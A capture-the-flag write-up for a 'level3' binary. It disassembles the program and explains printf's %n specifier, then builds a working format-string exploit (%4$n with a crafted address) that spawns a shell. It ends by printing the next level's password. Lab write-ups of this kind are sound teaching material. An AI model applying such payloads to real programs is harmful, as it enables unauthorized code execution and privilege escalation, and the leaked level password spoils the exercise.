## level3
`level3` also after running awaits the user to enter some input, once input is given it simply prints it to the standard output and exit. The function `main()` 
is pretty much the same as the one in `level2`
```
0x0804851a <+0>:	push   %ebp
0x0804851b <+1>:	mov    %esp,%ebp
0x0804851d <+3>:	and    $0xfffffff0,%esp
0x08048520 <+6>:	call   0x80484a4 <v>
0x08048525 <+11>:	leave
0x08048526 <+12>:	ret
```
The function simply sets the function prologue and then call the function `v()`.
Using `GBD` we disassembly the function `v()` to find out that it uses the `fgets()` instead of `gets()` function, `fgets()` has a bounding check what makes it secure
and we cannot use it to the __overflow__, we still have an option here, cuz the program after reading the input uses `printf()` to print it to the screen, we know there
is another techmnique we can use to gain control of a privileged program called __*format string exploit*__. Like __*buffer overflow*__ exploits, __*format string*__
also depend on programming mistakes. <br>
| Parameter| Input Type | Output Type |
|----------|------------|-------------|
|%d        | Value      | Decimal     |
|%u        | Value      | Unsigned decimal|
|%x        | Value      | Hexadecimal |
|%s        | Pointer    | String      |
|%n        | Pointer    | Number of bytes written so far|

The `%n` format parameter is unique in that it writes data without displaying anything. When a format function *(here `printf()`)* encouters a `%n` format parameter, it writes
the number of bytes that have been written by the function __address__ in the corresponding function argument.
 The `%n` can be used to write arbitrary data to potentially carefully-selected addresses.

Returning to the function `v()`, right after the call to `printf()` a value from *0x804988c* is moved into the register __eax__ and a comparison is
made:<br> `0x080484df <+59>:	cmp    eax,0x40`<br> if the value in the __address__ `0x080484df` is not equal to *0x40(64)* the program simply jumps to the `leave`
instruction and the function returns to the next instruction from `main()` that is the `leave` __address__ *0x08048525*.<br>Otherwise if value is equal to *0x40(64)* the execution will follow and the parameters to `<fwrite@plt>` will be loaded in the respectives register to print the value contained in the __address__ *0x8048600 ("Wait what?!\n")* right next the string contained in *0x804860d( "/bin/sh")* will be moved into *esp* <br> `0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d` <br> and the function `<system@plt>` will be called<br> `0x08048513 <+111>:	call   0x80483c0 <system@plt>` <br>So now we know that's what we want the function to do, so our task is to find a way to set the value at `0x804988c` to `0x40`, and this should be possible with `printf()`

Our task will be to put a format string specifier in the parameter passed to `printf()`<br>
We can check if `printf()` has access to the stack
```
(gdb) x/4xw $esp
0xbffff4d0:	0xbffff4e0	0x00000200	0xb7fd1ac0	0xb7ff37d0

~$ echo "%x %x %x %x" | ./level3
200 b7fd1ac0 b7ff37d0 25207825

~$ echo "AAAA %x %x %x %x %x %x" | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
```

Here we can see our string `AAAA` is being placed in the stack in the 4th place, what we need here is to replace the `AAAA` string with the __address__ that's being checked in the function *0x804988c* like so *(remember about little end first)*
```
~$ python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
200 b7fd1ac0 b7ff37d0 804988c
```
We will replace the *format string specifier* from `%x` to `%n` as what we are trying to do is set the __address__ value to *64* and as said above the `%n` can be used to write data to an __address__. <br> We will aslo be using the __Direct Parameter Access__ `($)` with *4* because as checked in our tests the `printf()` was placing it in the 4th position so the `%x` will become `%4$n` what means, write the number of bytes printed so for in the 4th position in the stack.<br>
*(Since this is being done on the command line and the dollar sign is a special charater, it must be scaped with a backslash)* <br>
So what we need is to create a string of *64 bytes (the number what will be checked in the v() function)* with the __address__ to write to *(that's is 4 bytes long)* plus *60 bytes* plus the *format string specifier* and that gives us: <br>
`(python -c "print(\x8c\x98\x04\x08) + 60 * 'A' + '%4\$n'")` <br>
Now just add the `cat` command with the `-` option to keep the standard entry open and get access to the shell <br>
```
(python -c "print('\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n')"; cat) | ./level3

�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
